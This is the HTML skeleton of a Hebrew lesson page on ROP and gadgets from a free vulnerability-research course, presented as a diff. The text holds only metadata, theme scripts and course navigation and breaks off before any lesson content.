@@ -1,0 +1,3325 @@
+
+<!doctype html>
+<html lang="he" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="בשיעור 2.3 כבר טעמנו את הגאדג'ט הראשון שלנו, pop rdi ; ret, כשרצינו להעביר ארגומנט לפונקציה מנצחת ב-64 ביט. בשיעור 4.2 השתמשנו ברעיון הזה כדי לבנות...">
+      
+      
+        <meta name="author" content="עמית פנחסי">
+      
+      
+        <link rel="canonical" href="https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/4%20-%20%D7%A2%D7%A7%D7%99%D7%A4%D7%AA%20NX%20%D7%95ROP%20%D7%91%D7%A1%D7%99%D7%A1%D7%99/4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D/4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/">
+      
+      
+        <link rel="prev" href="../../4.2%20-%20ret2libc%20%D7%A7%D7%9C%D7%90%D7%A1%D7%99/4.2%20-%20ret2libc%20%D7%A7%D7%9C%D7%90%D7%A1%D7%99%20-%20%D7%AA%D7%A8%D7%92%D7%95%D7%9C/">
+      
+      
+        <link rel="next" href="../4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D%20-%20%D7%A4%D7%AA%D7%A8%D7%95%D7%9F/">
+      
+      
+        
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS הזנת" href="../../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="הזנת RSS של תוכן מעודכן" href="../../../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../../../favicon.ico">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>4.3 - ROP וגאדג'טים - הרצאה - עמית טק</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Heebo:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Heebo";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../../../stylesheets/themes.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+  
+
+  <!-- Primary Meta Tags (name="description" is rendered by base.html from page.meta.description;
+       og:type/title/description/url and twitter:card/title/description are injected per-page by
+       the built-in social plugin - see material/plugins/social/templates/default.yml) -->
+  <meta name="author" content="עמית פנחסי">
+  <meta name="robots" content="index, follow">
+  <meta property="og:locale" content="he_IL">
+  <meta property="og:site_name" content="עמית טק">
+
+  
+  
+
+  <!-- Organization / WebSite structured data -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "Organization",
+        "@id": "https://amittech.dev/#organization",
+        "name": "עמית טק",
+        "url": "https://amittech.dev/",
+        "logo": "https://amittech.dev/amittech.png",
+        "founder": {
+          "@type": "Person",
+          "name": "עמית פנחסי"
+        },
+        "sameAs": ["https://discord.gg/ef5PQAAca2"]
+      },
+      {
+        "@type": "WebSite",
+        "@id": "https://amittech.dev/#website",
+        "name": "עמית טק",
+        "url": "https://amittech.dev/",
+        "description": "קורסי סייבר, תכנות, IT ומחשבים בחינם בעברית - מעל 2000 שעות לימוד עם תרגול מעשי. מתאים למתחילים ולמתקדמים.",
+        "inLanguage": "he",
+        "publisher": { "@id": "https://amittech.dev/#organization" }
+      },
+      {
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+          {
+            "@type": "ListItem",
+            "position": 1,
+            "name": "עמית טק",
+            "item": "https://amittech.dev/"
+          },
+          {
+            "@type": "ListItem",
+            "position": 2,
+            "name": "4.3 - ROP \u05d5\u05d2\u05d0\u05d3\u05d2\u0027\u05d8\u05d9\u05dd - \u05d4\u05e8\u05e6\u05d0\u05d4",
+            "item": "https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/4%20-%20%D7%A2%D7%A7%D7%99%D7%A4%D7%AA%20NX%20%D7%95ROP%20%D7%91%D7%A1%D7%99%D7%A1%D7%99/4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D/4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/"
+          }
+        ]
+      }
+    ]
+  }
+  </script>
+
+  <!-- Apply saved theme before first paint (prevents flash of default theme) -->
+  <script>
+    (function () {
+      /* Dark-based theme ids; everything else is treated as a light (default) scheme. */
+      var DARK = {
+        midnight: 1, dracula: 1, nord: 1, gruvbox: 1, "solarized-dark": 1,
+        matrix: 1, amber: 1, synthwave: 1, ocean: 1, emerald: 1, rose: 1, violet: 1
+      };
+      var id;
+      try { id = localStorage.getItem("am-theme"); } catch (e) { id = null; }
+      if (!id) id = "light";
+      var root = document.documentElement;
+      root.setAttribute("data-theme", id);
+      root.setAttribute("data-md-color-scheme", DARK[id] ? "slate" : "default");
+    })();
+  </script>
+
+  
+<meta property="og:type" content="website" />
+<meta property="og:title" content="4.3 - ROP וגאדג'טים - הרצאה - עמית טק" />
+<meta property="og:description" content="בשיעור 2.3 כבר טעמנו את הגאדג'ט הראשון שלנו, pop rdi ; ret, כשרצינו להעביר ארגומנט לפונקציה מנצחת ב-64 ביט. בשיעור 4.2 השתמשנו ברעיון הזה כדי לבנות..." />
+<meta property="og:image" content="https://amittech.dev/assets/images/social/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/4%20-%20%D7%A2%D7%A7%D7%99%D7%A4%D7%AA%20NX%20%D7%95ROP%20%D7%91%D7%A1%D7%99%D7%A1%D7%99/4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D/4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94.png" />
+<meta property="og:image:type" content="image/png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:url" content="https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/4%20-%20%D7%A2%D7%A7%D7%99%D7%A4%D7%AA%20NX%20%D7%95ROP%20%D7%91%D7%A1%D7%99%D7%A1%D7%99/4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D/4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" />
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="4.3 - ROP וגאדג'טים - הרצאה - עמית טק" />
+<meta property="twitter:description" content="בשיעור 2.3 כבר טעמנו את הגאדג'ט הראשון שלנו, pop rdi ; ret, כשרצינו להעביר ארגומנט לפונקציה מנצחת ב-64 ביט. בשיעור 4.2 השתמשנו ברעיון הזה כדי לבנות..." />
+<meta property="twitter:image" content="https://amittech.dev/assets/images/social/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/4%20-%20%D7%A2%D7%A7%D7%99%D7%A4%D7%AA%20NX%20%D7%95ROP%20%D7%91%D7%A1%D7%99%D7%A1%D7%99/4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D/4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94.png" />
+</head>
+  
+  
+    <body dir="rtl">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#-rop-" class="md-skip">
+          לדלג לתוכן
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="כותרת עליונה">
+    <a href="../../../.." title="עמית טק" class="md-header__button md-logo" aria-label="עמית טק" data-md-component="logo">
+      
+  <img src="../../../../amittech.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            עמית טק
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              4.3 - ROP וגאדג'טים - הרצאה
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="חיפוש" placeholder="חיפוש" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="חיפוש">
+        
+        <button type="reset" class="md-search__icon md-icon" title="ניקוי" aria-label="ניקוי" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            אתחול חיפוש
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="לשוניות" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  דף הבית
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  מי אני
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../blog/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  בלוג
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  תכנות
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%95%D7%95%D7%99%D7%A0%D7%93%D7%95%D7%A1-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  רשתות ומערכות הפעלה
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%A4%D7%A8%D7%99%D7%A6%D7%AA-%D7%90%D7%AA%D7%A8%D7%99%D7%9D/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  אבטחת מידע וסייבר
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  מחקר ו-Low Level
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="ניווט" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="עמית טק" class="md-nav__button md-logo" aria-label="עמית טק" data-md-component="logo">
+      
+  <img src="../../../../amittech.png" alt="logo">
+
+    </a>
+    עמית טק
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    דף הבית
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מי אני
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../blog/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    בלוג
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    תכנות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%95%D7%95%D7%99%D7%A0%D7%93%D7%95%D7%A1-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    רשתות ומערכות הפעלה
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%A4%D7%A8%D7%99%D7%A6%D7%AA-%D7%90%D7%AA%D7%A8%D7%99%D7%9D/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    אבטחת מידע וסייבר
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מחקר ו-Low Level
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    מחקר ו-Low Level
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ליבת המחשב
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מחקר חולשות
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    מחקר חולשות
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../0%20-%20%D7%94%D7%A7%D7%93%D7%9E%D7%94%20%D7%95%D7%AA%D7%A9%D7%AA%D7%99%D7%AA/0.1%20-%20%D7%9E%D7%94%20%D7%96%D7%94%20%D7%9E%D7%97%D7%A7%D7%A8%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/0.1%20-%20%D7%9E%D7%94%20%D7%96%D7%94%20%D7%9E%D7%97%D7%A7%D7%A8%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    0   הקדמה ותשתית
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../1%20-%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%A4%D7%A9%D7%95%D7%98%D7%95%D7%AA%20%D7%95%D7%91%D7%90%D7%92%D7%99%D7%9D%20%D7%9C%D7%95%D7%92%D7%99%D7%99%D7%9D/1.1%20-%20%D7%AA%D7%99%D7%90%D7%95%D7%A8%D7%99%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%95%D7%90%D7%A8%D7%92%D7%95%D7%9E%D7%A0%D7%98%D7%99%D7%9D/1.1%20-%20%D7%AA%D7%99%D7%90%D7%95%D7%A8%D7%99%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%95%D7%90%D7%A8%D7%92%D7%95%D7%9E%D7%A0%D7%98%D7%99%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1   חולשות פשוטות ובאגים לוגיים
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../2%20-%20%D7%92%D7%9C%D7%99%D7%A9%D7%AA%20%D7%97%D7%95%D7%A6%D7%A5%20%D7%A2%D7%9C%20%D7%94%D7%9E%D7%97%D7%A1%D7%A0%D7%99%D7%AA/2.1%20-%20%D7%90%D7%A0%D7%98%D7%95%D7%9E%D7%99%D7%94%20%D7%A9%D7%9C%20%D7%92%D7%9C%D7%99%D7%A9%D7%94%20%D7%95%D7%A9%D7%9C%D7%99%D7%98%D7%94%20%D7%91RIP/2.1%20-%20%D7%90%D7%A0%D7%98%D7%95%D7%9E%D7%99%D7%94%20%D7%A9%D7%9C%20%D7%92%D7%9C%D7%99%D7%A9%D7%94%20%D7%95%D7%A9%D7%9C%D7%99%D7%98%D7%94%20%D7%91RIP%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2   גלישת חוצץ על המחסנית
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../3%20-%20Shellcode/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3   Shellcode
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_6" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_6" id="__nav_7_2_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4   עקיפת NX וROP בסיסי
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_2_6_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    4   עקיפת NX וROP בסיסי
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7/4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.1   GOT וPLT לעומק
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
